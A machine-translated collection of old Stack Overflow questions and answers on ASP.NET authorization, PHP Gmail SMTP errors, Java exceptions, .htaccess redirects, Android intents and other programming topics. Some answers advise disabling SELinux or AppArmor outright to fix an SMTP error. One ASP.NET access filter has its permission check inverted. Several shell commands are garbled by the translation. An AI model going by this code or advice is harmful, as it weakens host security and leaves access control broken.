```

然后，在每个操作的顶部提供对受控资源的访问：

```
public ActionResult Details(int id)
{
    var employee = employeeRepository.Get(id)
    var user = (CustomIdentity)ControllerContext.HttpContext.User.Identity;
    if(!employee.CanUserAccess(user))
        return new HttpUnauthorizedResult();

    // Normal logic here
} 
```

它当然不是完美的，但它确实集中了权限处理，并允许您在未来轻松增加复杂性（允许访问链，HR 的特殊规则等）。您还可以编写另一个重载/扩展来访问该`User.Identity`属性以实现更多自动化（或至少处理类型转换）。

由于我处理的是 ACL，因此我将有额外的方法/参数来指定操作的基本性质（例如读取、写入、删除、创建等）。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-26T18:36:21.527

这是一个解决方案。它需要进行一些清理，但应该为您提供所需的一切。

创建一个自定义 ActionFilter，然后用它装饰您的方法。

```
[ManagerIdAuthentication]
public ActionResult Details(int id)
{
     // Gets executed if the filter allows it to go through.
} 
```

下一个类可以在单独的库中创建，因此您可以将其包含在需要此验证的所有操作中。

```
public class ManagerIdAuthentication : ActionFilterAttribute
{
    public override void OnActionExecuting(ActionExecutingContext filterContext)
    {
        // the next line needs improvement, only works on an httpGet since retrieves
        // the id from the url.  Improve this line to obtain the id regardless of 
        // the  method (GET, POST, etc.)
        var id = filterContext.HttpContext.Request.QueryString["id"];

        var employee = employeeRepository.Get(id);
        var user = filterContext.HttpContext.User.Identity;
        if (employee.managerId  == user.managerId)
        {
            var res = filterContext.HttpContext.Response;
            res.StatusCode = 402;
            res.End();
            filterContext.Result = new EmptyResult();  //may use content result if want to provide additional info in the error message.
        }
        else
        {
            // OK, let it through.
        }
    }
} 
```

# objective-c - UIImageView 以编程方式将方向更改为横向模式

> ID：10338736
> 
> 赞同：4
> 
> 时间：2012-04-26T17:51:44.737
> 
> 标签：objective-c, ios, uiimageview, orientation, landscape-portrait

我有一个问题，我需要旋转 UIImageView 并根据它是纵向模式还是横向模式调整大小。

我已经设法让图像视图正确旋转，正如这个相关问题中的答案所说：[Rotate UIImageView Based on iPhone Orientation](https://stackoverflow.com/questions/3377754/rotate-uiimageview-depending-on-iphone-orientation)。

这是我的旋转代码（现在我只专注于将其旋转到左横向）：

```
- (void)rotateImage:(UIImageView *)image duration:(NSTimeInterval)duration 
          curve:(int)curve degrees:(CGFloat)degrees
{
    [UIView beginAnimations:nil context:NULL];
    [UIView setAnimationDuration:duration];
    [UIView setAnimationCurve:curve];
    [UIView setAnimationBeginsFromCurrentState:YES];

    float angle = DEGREES_TO_RADIANS(degrees);    
    CGAffineTransform transform = CGAffineTransformRotate(
                        CGAffineTransformMakeTranslation(
                                                         160.0f-self.view.center.x,
                                                         240.0f-self.view.center.y
                                                         ),angle);
    image.transform = transform;
    [UIView commitAnimations];
} 
```

我如何启动 UIImageView：

```
UIImage *image = [UIImage imageNamed:@"picture.png"];
self.testImageView = [[UIImageView alloc] initWithFrame:CGRectMake(0, 0, 320, 400)];
self.testImageView.image = image;
self.testImageView.contentMode = UIViewContentModeScaleAspectFit;
self.testImageView.autoresizingMask = UIViewAutoresizingFlexibleWidth | UIViewAutoresizingFlexibleHeight; 
```

现在发生的事情是图像被旋转但与横向模式下的纵向模式大小相同，但居中（我明白为什么，因为我将旋转作为链接问题的答案）。

所以，我想要的是全屏查看图像，因为原始图像具有适合全屏横向的比例。正如我设置的

```
UIViewContentModeScaleAspectFit 
```

我最初的天真认为这会神奇地重新缩放以适应适当的景观比例。显然情况并非如此。有什么提示吗？

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-04-27T07:29:06.863

尝试使用 UIViewContentModeScaleAspectFit 并将您的父视图属性 autoresizesSubviews 设置为 YES。图像应自动调整大小。

# javascript - Javascript 关键字 THIS 和 ELEMENT

> ID：10338738
> 
> 赞同：3
> 
> 时间：2012-04-26T17:51:54.863
> 
> 标签：javascript

```
if( !sky.containers ) sky.containers =
{
        Window : function()
        {
                this.element = document.createElement("div");
                this.element.modal = false; 
                this.element.height = 240;
                this.element.draggable = true;
                this.element.resizable = true;
                this.element.position = "center";
                this.element.width = 240;
                this.element.target = document.body;
                this.element.title ="";
                this.element.headerHeight = 30;;
                this.element.effects = {};
                this.element.show = function()

                return this.element;

        }} 
```

在这种情况下，关键字 THIS 是什么？“sky.containers”或“Window”？什么是 ELEMENT，如果没有变量定义这个名称？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-26T17:55:23.517

Window() 是一个构造函数。这意味着当您使用类似的东西创建一个新对象时它会被调用

```
var myWin = new Window(); 
```

在函数内部，`this`将引用刚刚创建的新对象。`myWin`（并且在上面的示例调用中分配给它。）

至于“元素”，它是新创建的对象的属性。直到这一行才存在：

```
this.element = document.createElement("div"); 
```

它创建了一个新的 <div> 元素并将它的 DOM 表示分配给属性。

# php - 使用 php 脚本 smtp.gmail Pear Centos 发送电子邮件时出错

> ID：10338750
> 
> 赞同：4
> 
> 时间：2012-04-26T17:52:27.903
> 
> 标签：php, ssl, smtp, gmail, pear

我阅读了很多解释如何使用 smtp[发送电子邮件的文章，例如从 PHP 页面使用 GMail SMTP 服务器发送电子邮件](https://stackoverflow.com/questions/712392/send-email-using-gmail-smtp-server-from-php-page) 我有一个云服务器和一个本地主机设置，两者都是相同的（Centos 6，只安装了 httpd，php和 mysql 通过 yum）。iptables 是一样的：输出端口打开，只输入 22 和 80。

我安装了 pear Mail 和 pear Net_SMTP 与 smtp.gmail.com 一起使用。phpinfo(); 显示 openssl 已启用。

我正在使用这段代码：

```
 <?php  require_once "Mail.php";

    $from = "<from.gmail.com>";
    $to = "<to.yahoo.com>";
    $subject = "Hi!";
    $body = "Hi,\n\nHow are you?";

    $host = "ssl://smtp.gmail.com";
    $port = "465";
    $username = "<myaccount.gmail.com>";
    $password = "password";

    $headers = array ('From' => $from,
      'To' => $to,
      'Subject' => $subject);
    $smtp = Mail::factory('smtp',
      array ('host' => $host,
        'port' => $port,
        'auth' => true,
        'username' => $username,
        'password' => $password));

    $mail = $smtp->send($to, $headers, $body);

    if (PEAR::isError($mail)) {
      echo("<p>" . $mail->getMessage() . "</p>");
     } else {
      echo("<p>Message successfully sent!</p>");
     }

?>  <!-- end of php tag--> 
```

*在我的本地主机服务器上，脚本工作，我在我的 gmail 帐户中收到了电子邮件。*但是在我的云服务器上，使用相同的脚本，我收到了这个错误：（使用调试）

**ErrorFailed to connect to ssl://smtp.gmail.com:465 [SMTP: Failed to connect socket: Permission denied (code: -1, response: )]DEBUG: Send: QUIT**

我搜索了很多，我看到有人说当 465 端口被阻塞时会发生错误。

所以我查看了我的 iptables、我的连接等，并打开了 OUTPUT 的端口 465。

我做了一个测试： **openssl s_client -verify 0 -connect smtp.gmail.com:465** 我得到了这个结果：

```
verify depth is 0
CONNECTED(00000003)
depth=2 C = US, O = Equifax, OU = Equifax Secure Certificate Authority
verify return:1
depth=1 C = US, O = Google Inc, CN = Google Internet Authority
verify return:1
depth=0 C = US, ST = California, L = Mountain View, O = Google Inc, CN = smtp.gmail.com
verify return:1
---
Certificate chain
 0 s:/C=US/ST=California/L=Mountain View/O=Google Inc/CN=smtp.gmail.com
   i:/C=US/O=Google Inc/CN=Google Internet Authority
 1 s:/C=US/O=Google Inc/CN=Google Internet Authority
   i:/C=US/O=Equifax/OU=Equifax Secure Certificate Authority
---
Server certificate
-----BEGIN CERTIFICATE-----
MIIDWzCCAsSgAwIBAgIKFeQVggADAAA7NjANBgkqhkiG9w0BAQUFADBGMQswCQYD
VQQGEwJVUzETMBEGA1UEChMKR29vZ2xlIEluYzEiMCAGA1UEAxMZR29vZ2xlIElu
dGVybmV0IEF1dGhvcml0eTAeFw0xMTExMTgwMTU3MTdaFw0xMjExMTgwMjA3MTda
MGgxCzAJBgNVBAYTAlVTMRMwEQYDVQQIEwpDYWxpZm9ybmlhMRYwFAYDVQQHEw1N
b3VudGFpbiBWaWV3MRMwEQYDVQQKEwpHb29nbGUgSW5jMRcwFQYDVQQDEw5zbXRw
LmdtYWlsLmNvbTCBnzANBgkqhkiG9w0BAQEFAAOBjQAwgYkCgYEAuK+t5ZRq6c3K
kWPwLuIcPa6DgiBURaQK9akP4OBoXKJ6bqYIQWsS4C3RgnOaGaDENadxHSNZ5Qpl
Vqg2S54N54SM5OXwOq0NtrqdlbhgigB53TZouiJvnLDxxIexSOn2Gx1qyZF2z8Ii
MoUhHuStWgW5YoOHje8z6K9xQdYkQp0CAwEAAaOCASwwggEoMB0GA1UdDgQWBBTs
OL4jbtJ5l8B6/eoEvv30KEiTrjAfBgNVHSMEGDAWgBS/wDDr9UMRPme6npH7/Gra
42sSJDBbBgNVHR8EVDBSMFCgTqBMhkpodHRwOi8vd3d3LmdzdGF0aWMuY29tL0dv
b2dsZUludGVybmV0QXV0aG9yaXR5L0dvb2dsZUludGVybmV0QXV0aG9yaXR5LmNy
bDBmBggrBgEFBQcBAQRaMFgwVgYIKwYBBQUHMAKGSmh0dHA6Ly93d3cuZ3N0YXRp
Yy5jb20vR29vZ2xlSW50ZXJuZXRBdXRob3JpdHkvR29vZ2xlSW50ZXJuZXRBdXRo
b3JpdHkuY3J0MCEGCSsGAQQBgjcUAgQUHhIAVwBlAGIAUwBlAHIAdgBlAHIwDQYJ
KoZIhvcNAQEFBQADgYEAQiMlHuQLRFqR10UsSg5WTNe3vagbdnBLAkdhvAf90B5a
9beBxJH2/ylTSIGfD2uceAqzcsQe6Ouy4C9r3rz86qA1dhdtIcPg6uoZb+E2qhE5
UaOJOPO4rHInX9kscBxh+baHbpBMh+ch6v5L8plss8hd0id8C4g10YKzwcgPYlQ=
-----END CERTIFICATE-----
subject=/C=US/ST=California/L=Mountain View/O=Google Inc/CN=smtp.gmail.com
issuer=/C=US/O=Google Inc/CN=Google Internet Authority
---
No client certificate CA names sent
---
SSL handshake has read 1850 bytes and written 299 bytes
---
New, TLSv1/SSLv3, Cipher is RC4-SHA
Server public key is 1024 bit
Secure Renegotiation IS supported
Compression: NONE
Expansion: NONE
SSL-Session:
    Protocol  : TLSv1
    Cipher    : RC4-SHA
    Session-ID: 55E90A8854BB04C962AB8AD7D231C89291E62B28EC93F4189CFD512B2EFD43B6
    Session-ID-ctx:
    Master-Key: C454B3ED7E5C522B745F0E2EBF45BDEADFAD2CE29ECE945C1CA6EBA1629921577FEECFF968D896E39CF4E0057731CD26
    Key-Arg   : None
    Krb5 Principal: None
    PSK identity: None
    PSK identity hint: None
    TLS session ticket lifetime hint: 100800 (seconds)
    TLS session ticket:
    0000 - 75 be ab 14 ff bf e3 74-61 4f 98 e6 ec 58 ae ab   u......taO...X..
    0010 - 50 2f 20 f5 12 14 ae b5-11 dd 2c c1 9e 99 36 b1   P/ .......,...6.
    0020 - 9a 66 5b 76 15 c8 0e 7f-07 ce ce e1 4c b3 f4 12   .f[v........L...
    0030 - 38 c8 43 2d a2 c7 f9 62-17 4f da 82 4f 4b 12 93   8.C-...b.O..OK..
    0040 - af 31 9e d5 90 8d 3e 4c-06 d6 73 30 fb b6 95 80   .1....>L..s0....
    0050 - 59 1c 65 e3 d3 51 2e a7-48 15 11 ba 9f 72 89 12   Y.e..Q..H....r..
    0060 - 9a 68 63 df 65 22 0f cb-60 b7 cf 3c b4 c6 f9 92   .hc.e"..`..<....
    0070 - a0 c1 34 d7 06 31 97 ef-e6 8a bf b8 14 d9 72 b0   ..4..1........r.
    0080 - 13 d9 dd df ce 48 a1 83-74 53 d6 fe b0 5a 53 a1   .....H..tS...ZS.
    0090 - ee d0 9e b3                                       ....

    Start Time: 1335462088
    Timeout   : 300 (sec)
    Verify return code: 0 (ok)
--- 
```

所以，我认为这个问题与“阻塞端口”无关。我也试过587端口...

我向我的主机发送了一条消息，询问 ISP 是否可以阻止这些端口，他们告诉我他们不会阻止任何端口，客户端（我）可以完全控制服务器。

我不知道还有什么会导致此错误以及我现在可以做什么。也许我没有看到一些配置文件。

**任何人都有一些建议可以帮助我或建议我可以做更多的测试来获取更多关于我为什么会收到该错误并解决此问题的信息？**

谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-26T18:24:00.730

您可以检查您的系统中的应用程序装甲或 SELinux 是否处于活动状态。要禁用应用装甲：

> 可以禁用 AppArmor，并通过输入以下命令卸载内核模块：
> 
> 须藤 /etc/init.d/apparmor 停止
> 
> sudo update-rc.d -f apparmor 删除
> 
> 重启

要禁用 SELINUX：

> 编辑 /etc/selinux/config 并将 SELINUX 行更改为 SELINUX=disabled
> 
> 重启

或更清洁的方法（SELINUX）：

> /usr/sbin/setsebool httpd_can_network_connect=1
> 
> 重启

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-28T13:34:51.107

确保您取消注释 ;extension=php_openssl.dll 意味着删除 php.ini 文件中的分号。如果您没有找到这一行，则复制“extension=php_openssl.dll”并将其粘贴到您的 php.ini 文件中

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-09-09T15:08:51.963

在终端中输入此命令（无需重新启动），它会将 SELinux 设置为允许（它只会提醒它不会停止进程并且也不需要重新启动）

```
setenforce 0 
```

并且非常验证您可以选择

```
getenforce 
```

如果你想禁用你可以这样做

```
edit /etc/selinux/config
or
gedit /etc/selinux/config
or
vi /etc/selinux/config 
```

并将您的文件更改为此

```
# This file controls the state of SELinux on the system.
# SELINUX= can take one of these three values:
#     enforcing - SELinux security policy is enforced.
#     permissive - SELinux prints warnings instead of enforcing.
#     disabled - No SELinux policy is loaded.
SELINUX=disabled
# SELINUXTYPE= can take one of these two values:
#     targeted - Targeted processes are protected,
#     minimum - Modification of targeted policy. Only selected processes are protected. 
#     mls - Multi Level Security protection.
SELINUXTYPE=targeted 
```

谢谢 ：）

# java - 使用 try/catch 块捕获来自文件的输入的异常

> ID：10338760
> 
> 赞同：0
> 
> 时间：2012-04-26T17:53:02.550
> 
> 标签：java

我很确定我的问题存在于某处的 try 块中，但我似乎无法确定它。我正在做的是从文件中读取，并检查输入。如果输入大于 0，我想增加 goodData，如果不是，它应该为值 <0 抛出 BPIllegalValueException，或者对于不是整数的东西抛出 InputMismatchException。我希望你们能帮忙。

编辑：教授说明：

> 在您的程序中，您需要两个异常来处理两种不良数据。对于非整数读取，可以使用 nextInt() 方法从文件中读取一个整数，如果数据不是整数，则会抛出 InputMismatchException。您的程序必须捕获此异常。要处理负读取，您可能需要声明自己的异常类：BPIllegalValueException（您应该编写包含该类的 BPIllegalValueException.java），并在读取负值时抛出此异常。注意：当读取到错误数据时，您的程序不应终止。因此，您必须使用 try/catch 块来处理不良数据。您的程序应打印（在屏幕上）良好 BP 读数的数量和不良数据的数量。

我的代码如下：

```
import java.io.*;
import java.util.*;

public class DemoEx {

public static void main(String[] args) throws IOException
{
    FileReader fr = new FileReader("BP.txt");
    BufferedReader br = new BufferedReader(fr);
    Scanner in = new Scanner(new FileReader("BP.txt"));
    int badData = 0;
    int goodData = 0;
    int data;
    String str = "";

    while((str = br.readLine()) != null)
    {   
        try
        {
            data = in.nextInt();
            if(data>0)
                goodData++;
            else if(data<0)
                throw new BPIllegalValueException(data);
            else
                throw new InputMismatchException();
        }

        catch(InputMismatchException ex)
        {
            badData++;
        }

        catch(BPIllegalValueException ex)
        {
            badData++;
        }
    }

    System.out.println("The number of good data: " + goodData);
    System.out.println("The number of bad data: " + badData);

}

} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-26T17:57:47.240

当你只想增加一个计数器时，为什么要抛出异常？

看起来像你想要的，

```
if (data > 0) 
    goodData++ 
 else 
     badData++; 
```

现在，在您执行此操作之前，请确保数据是一个整数，如果您执行 .nextInt（如果有），您将获得该整数，并且将跳过所有其他非整数值。所以这取决于你读取数据的方式，为什么是扫描仪？为什么不使用缓冲阅读器和 readLine 然后拆分它做任何你喜欢的事情？

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-26T17:59:12.950

根据您的示例，您为什么还要使用异常？您正在做的不是处理错误，看起来您正在执行逻辑。错误应该是显示停止器，而不是用于在您的代码中执行逻辑。只是增加坏数据而不是使用异常。异常也会减慢您的代码速度。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-26T18:09:03.463

您不需要遍历两个不同的流。扫描仪应该足够了。

```
 BufferedReader br = new BufferedReader(new FileReader("BP.txt"));
    Scanner in = new Scanner(br); 
```

此外，您不应将异常用于控制流，而应使用 if/else 语句。

```
 if(data > 0){
            goodData++;
        }else { //if (data <= 0)
            badData++;
        } 
```

循环应该由扫描仪控制，它是寻找数字的那个：

```
 while(in.hasNext()){ ... } 
```

最后，如果您的文件包含与数字不同的其他标记，请确保对它们进行迭代，否则您将编写一个无限循环：

```
 if(in.hasNextInt()){
            data = in.nextInt();
        }else{
            in.next(); //makes sure you move to the next token if it is not an int.
        } 
```

总的来说，是这样的：

```
 BufferedReader br = new BufferedReader(new FileReader("BP.txt"));
    Scanner in = new Scanner(br);
    int badData = 0;
    int goodData = 0;
    int data = 0; //this must be initialized

    while(in.hasNext()){
        if(in.hasNextInt()){
            data = in.nextInt();
            if(data > 0){
                goodData++;
            }else if (data <= 0){
                badData++;
            }
        }else{
            in.next(); //move to the next token when it-s not an int.
        }

    }

System.out.println("The number of good data: " + goodData);
System.out.println("The number of bad data: " + badData); 
```

如果您的文件 BP.txt 包含以下内容： 1 2 ABC 4 5 6 -1 -2 CB

它会输出：

```
The number of good data: 8
The number of bad data: 4 
```

哪个假设对应于您期望的输出。

# .htaccess - htaccess 通配符重定向不使用域名上的斜杠进行重定向

> ID：10338762
> 
> 赞同：1
> 
> 时间：2012-04-26T17:53:05.807
> 
> 标签：.htaccess

这是我现在在 .htaccess 文件中的代码：

```
RewriteEngine on
RewriteCond %{HTTP_HOST} ^centerforpolicyanalysis.org$ [OR]
RewriteCond %{HTTP_HOST} ^www.centerforpolicyanalysis.org$
RewriteRule ^(.*)$ "http\:\/\/www\.equalhealth\.info$1" [R=301,L] 
```

我想将所有访问[http://(www.)centerforpolicyanalysis.org](http://(www.)centerforpolicyanalysis.org)的人重定向到[http://www.equalhealth.info](http://www.equalhealth.info)

如果这就是您在 url 中输入的所有内容，它可以正常工作，但如果您输入子目录，它会失败。

这就是我得到的：我输入

```
http://www.centerforpolicyanalysis.org/index.php/2011/06/recommendations-for-preventive-services-to-women-and-girls/ 
```

我得到

```
http://www.equalhealth.infoindex.php/2011/06/recommendations-for-preventive-services-to-women-and-girls/ 
```

它打破了。如何让它在重定向时保留域名的尾部斜杠？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-26T17:56:48.740

将您的代码更改为：

```
Options +FollowSymLinks -MultiViews
# Turn mod_rewrite on
RewriteEngine On
RewriteBase /

RewriteCond %{HTTP_HOST} ^(www\.)?centerforpolicyanalysis\.org$ [NC]
RewriteRule ^ http://www.equalhealth.info%{REQUEST_URI} [R=301,L] 
```

# asp.net - 如何处理 ASP.net 的神秘隐藏值？(__VIEWSTATE)

> ID：10338763
> 
> 赞同：3
> 
> 时间：2012-04-26T17:53:16.507
> 
> 标签：asp.net, python, parsing, viewstate

当您尝试使用 Python 请求（POST）页面时，我试图弄清楚如何处理神秘的“__VIEWSTATE”和 Cie。它是我的脚本中很多问题的主要来源......而且我意识到，当我在寻找答案/解决方案时，你没有那么多的解决方案（几乎 0 ！）。

**在本主题中：** [无法使用 Python urllib2 加载 ASP.NET 页面](https://stackoverflow.com/questions/5380638/unable-to-load-asp-net-page-using-python-urllib2) 您可以看到我的解决方案包括每次加载页面时解析神秘字段的值......这有效，但实际上这很愚蠢:-)

```
 for result in the_page.findAll('input', attrs={'name' : '__VIEWSTATE'}):
        view_state =  result['value']

    for result_1 in the_page.findAll('input', attrs={'name' : '__EVENTVALIDATION'}):
        event_validation =  result_1['value']

    for result_2 in the_page.findAll('input', attrs={'name' : '__PREVIOUSPAGE'}):
        previous_page =  result_2['value']

    for result in the_page.findAll('input', attrs={'name' : '__EVENTTARGET'}):
        event_target =  result['value'] 
```

之后 ：

```
 url = 'http://bandscore.ielts.org/search.aspx'
    values = {
                            '__EVENTTARGET' : 'gdvSearchResults',
                            '__EVENTARGUMENT' : page,
                        '__VIEWSTATE' : view_state,
                        '__PREVIOUSPAGE' : previous_page,
                        '__EVENTVALIDATION' : event_validation,
                        'DropDownList1'  : Country,
                        #'txtSearchInstitution'  : '',
                        #'hdnSearchText'  : '',
                        #'rdoFilter': '%25',
    }
    user_agent = 'Mozilla/5 (Solaris 10) Gecko'
    headers = { 'User-Agent' : user_agent }
    data = urllib.urlencode(values)
    req = urllib2.Request(url, data, headers)
    response = urllib2.urlopen(req)
    thePage = response.read()
    the_page = soup(thePage) 
```

因此，这里还有一些带有很好解释的链接/一些正在提出解决方案：

[__VIEWSTATE 持有什么？](https://stackoverflow.com/questions/1350216/what-does-the-viewstate-hold)

[http://aspalliance.com/articleViewer.aspx?aId=135&pId=](http://aspalliance.com/articleViewer.aspx?aId=135&pId=)

[http://msdn.microsoft.com/en-us/library/system.web.ui.losformatter.aspx](http://msdn.microsoft.com/en-us/library/system.web.ui.losformatter.aspx)

[http://weblogs.asp.net/infinitiesloop/archive/2006/08/03/Truly-Understanding-Viewstate.aspx](http://weblogs.asp.net/infinitiesloop/archive/2006/08/03/Truly-Understanding-Viewstate.aspx)

[http://msdn.microsoft.com/en-us/library/ms972976.aspx](http://msdn.microsoft.com/en-us/library/ms972976.aspx)

[机械化没有看到一些隐藏的表单输入？](https://stackoverflow.com/questions/3338214/mechanize-does-not-see-some-hidden-form-inputs)

[无法使用 Python urllib2 加载 ASP.NET 页面](https://stackoverflow.com/questions/5380638/unable-to-load-asp-net-page-using-python-urllib2)

我意识到很多人都在试图找到一个好的方法来解决这个问题，所以让我们一起努力找到一个好的解决方案;-)

**EDIT1**：发现也可能很有趣[http://code.google.com/p/peekviewstate/source/browse/trunk/src/peekviewstate_example.py](http://code.google.com/p/peekviewstate/source/browse/trunk/src/peekviewstate_example.py)

（对不起，这篇文章不完美/没有很好的信息……我很n00b，但我很努力）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-26T20:14:26.437

如何处理？只需将其`__VIEWSTATE`视为服务器发送给您的不透明数据。它包含给定页面的一些特定数据及其对象的状态，我真的不建议您修改它。

如果您想使用浏览器模拟某些 ASP.NET 应用程序，您需要在请求中包含那些`POST`，以便服务器可以重建页面的状态。

它引起的确切问题是什么？我认为您的解决方案非常简单。

顺便说一句，只是附带说明 - 很多 ASP.NET 应用程序包含公共 API，可以使用它而不是尝试解析它的页面。

# javascript - 如何在悬停或单击时打开 JS 菜单

> ID：10338766
> 
> 赞同：1
> 
> 时间：2012-04-26T17:53:24.370
> 
> 标签：javascript, jquery, touch

我有一个 JS+CSS 菜单，它在鼠标悬停时非常有效，但我必须让它也适用于点击触摸设备。

菜单是这样的：

```
<div id="menucontainer">
  <ul id="jsddm">              
    <li class="topmenu"><a href="#">Main Menu</a>
      <ul style="visibility: hidden;">
          <li><a href="http://www.google.com">Google</a></li>
          <li><a href="http://www.apple.com">Apple</a></li>
          <li><a href="http://www.microsoft.com">Microsoft</a></li>
      </ul>
    </li>        
  </ul>
</div> 
```

和 JS：

```
$(document).ready(function () {
    $('#jsddm > li').bind('mouseover', jsddm_open);
    $('#jsddm > li').bind('mouseout', jsddm_timer);

    // this work, but the submenus dont click
    $('.topmenu').bind('click', jsddm_open);
}); 
```

尝试了不同的方法，没有成功

此处的工作示例：http: [//jsfiddle.net/xjuZ4/](http://jsfiddle.net/xjuZ4/)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-26T17:57:36.007

将点击处理程序放在`<a>`标签上。通过将点击处理程序放在顶级`<li>`标签上，您将拦截对子标签的任何点击，`<li>`因为点击子`<li>`标签也会点击父`<li>`标签。

您需要添加`e.stopPropagation();`到`<a>`标签上的点击处理程序以阻止触发悬停。

您还很可能希望使用 JQuery 方法`.parent()`来查找触发该方法时所存在的`<li>`对象。`<a>``click`

使用多个下拉菜单更新[了 JSFiddle 。](http://jsfiddle.net/xjuZ4/13/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-10T14:01:58.370

在您的 javascript 中删除`$('.topmenu').bind('click', jsddm_open);`，因为您在 tag 中调用链接`<a>`。

# google-sheets - Google 电子表格 COUNTIF 公式等效于两个条件

> ID：10338767
> 
> 赞同：10
> 
> 时间：2012-04-26T17:53:26.407
> 
> 标签：google-sheets

我有一个包含几列的 Google 文档电子表格。在列 DI 中有值 Man OR Woman。在 GI 列中有值是或否。我想做的是计算 MAN 会回答 YES 的次数。所以有两个标准 1.Man 和 2.Yes

我有这个公式，它只计算单元格 D2 和 G2 中的值。我想计算从 D2 到 D500 以及从 G2 到 G500 的值。

=IF(AND('Revision: 2'!D2="Man",'Revision: 2'!G2="Yes"),1,0)

我怎么能这样做？

谢谢！

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-04-26T17:58:51.577

Google 电子表格不支持 COUNTIFS 函数...但是以下是您可以用于您想做的事情的几个公式之一...

```
=ArrayFormula( SUM( ( D2:D500 = "Man" ) * ( G2:G500 = "Yes" ) ) ) 
```

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2014-06-22T05:48:46.233

在[新版本](http://googleblog.blogspot.com.br/2013/12/new-google-sheets-faster-more-powerful.html)的 Google 电子表格中，已经内置了[COUNTIFS 。您可以将其用于多个条件。](https://support.google.com/docs/answer/3256550)

**样品用法：**

```
COUNTIFS(A1:A10, ">20", B1:B10, "<30")
COUNTIFS(A7:A24, ">6", B7:B24, "<"&DATE(1969,7,20))
COUNTIFS(B8:B27, ">" & B12, C8:C27, "<" & C13, D8:D27, “&lt;>10”) 
```

# android - ListView 与 RadioButton 一起出现

> ID：10338770
> 
> 赞同：0
> 
> 时间：2012-04-26T17:53:41.213
> 
> 标签：android, android-listview

listView 总是出现一个单选按钮，所以有什么办法可以删除这个单选按钮？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-26T18:04:56.410

您可以使用适当的适配器自定义每个项目的布局。您看到的是 android.R.layout.simple_spinner_item 给出的布局，这是默认设置，但您可以使用以下内容覆盖它：

```
Spinner spinner = (Spinner) findViewById(R.id.spinner);
ArrayAdapter<CharSequence> adapter = ArrayAdapter.createFromResource(
        this, R.array.my_array, R.layout.my_spinner_item);
adapter.setDropDownViewResource(R.layout.my_spinner_dropdown_item);
spinner.setAdapter(adapter); 
```

您可以在 Spinner 教程中找到更多信息：

[http://developer.android.com/resources/tutorials/views/hello-spinner.html](http://developer.android.com/resources/tutorials/views/hello-spinner.html)

# android - Android：“选择使用哪个应用程序打开它”对话框中提供短信应用程序

> ID：10338776
> 
> 赞同：3
> 
> 时间：2012-04-26T17:53:52.117
> 
> 标签：android, sms, android-4.0-ice-cream-sandwich

我正在开发一个短信应用程序。如何在“选择使用哪个应用程序打开它”对话框中使该应用程序可用？

谢谢，马丁

/编辑：我想你只是误解了我。

我不想用我的应用程序编写短信，我希望其他人可以使用我的应用程序编写短信，并且当您在联系人列表。

我的应用程序清单的摘录：

```
 <activity
        android:name=".MainActivity"
        android:label="@string/app_name" >
        <intent-filter>
            <action android:name="android.intent.action.MAIN" />

            <category android:name="android.intent.category.LAUNCHER" />
            <category android:name="android.intent.category.APP_MESSAGING" />
        </intent-filter>
    </activity> 
```

添加类别“APP_MESSAGING”只是没有解决它。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-26T17:59:02.870

这是通过意图过滤器完成的。

[http://developer.android.com/guide/topics/intents/intents-filters.html](http://developer.android.com/guide/topics/intents/intents-filters.html)

查看“意图解析”和“意图过滤器”

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-30T14:10:41.807

好吧，我有一个类似的问题。这就是我修复它的方法。这就是我在清单文件中声明我的活动的方式：

```
 <activity
        android:name="com.example.sms.MainActivity"
        android:label="@string/title_activity_main" >
        <intent-filter>
            <action android:name="android.intent.action.MAIN" />
            <category android:name="android.intent.category.LAUNCHER" />
        </intent-filter>
        <intent-filter>
              <action android:name="android.intent.action.SENDTO"/>
              <category android:name="android.intent.category.DEFAULT" />
              <data android:scheme="sms" />
              <data android:scheme="smsto" />
        </intent-filter>

    </activity> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-11-16T05:14:33.767

只需将这两个意图过滤器添加到您的主要活动中，您的应用程序将在 SMS 应用程序列表中可用

```
<activity
        android:name=".activities.MainAcitivty"
        android:label="@string/app_name" >

        <intent-filter>
            <action android:name="android.intent.action.MAIN" />
            <category android:name="android.intent.category.LAUNCHER" />
        </intent-filter>

       <!--add these intent filters to your app-->
        <intent-filter>
            <action android:name="android.intent.action.MAIN"/>
            <category android:name="android.intent.category.DEFAULT"/>
            <data android:mimeType="vnd.android.cursor.dir/mms"/>
        </intent-filter>
        <intent-filter>
            <action android:name="android.intent.action.MAIN"/>
            <category android:name="android.intent.category.DEFAULT"/>
            <data android:mimeType="vnd.android-dir/mms-sms"/>
        </intent-filter>
</activity> 
```

# c - C windows _popen on 命令请求输入：避免冻结

> ID：10338777
> 
> 赞同：0
> 
> 时间：2012-04-26T17:53:52.377
> 
> 标签：c, windows, popen, freeze

我有这个问题；我正在编写一个必须执行 cmd 命令的 C 编码服务器。main() 必须创建一个新线程，并且该线程必须创建一个新进程，该进程必须启动此 cmd 命令并发回结果。

如果该命令只发回输出（即 dir、netstat、ls 等），这可以正常工作。但是，当我尝试使用具有 ro 等待输入为“日期”（等待新日期）的命令时，新进程冻结。这是不可能解决的，因为我可以在新进程的句柄上使用 WaitForSingleObject 并使用超时，所以如果进程有一段时间没有完成，我可以使用 TerminateProcess() 终止它。

但是使用进程 cmd.exe 将继续运行，因为它是由我的服务器进程启动的，并且从未关闭。

我不关心需要输入的命令，我只想忽略它们，这样如果 _popen 等待某些东西，我只需关闭 cmd 并返回。

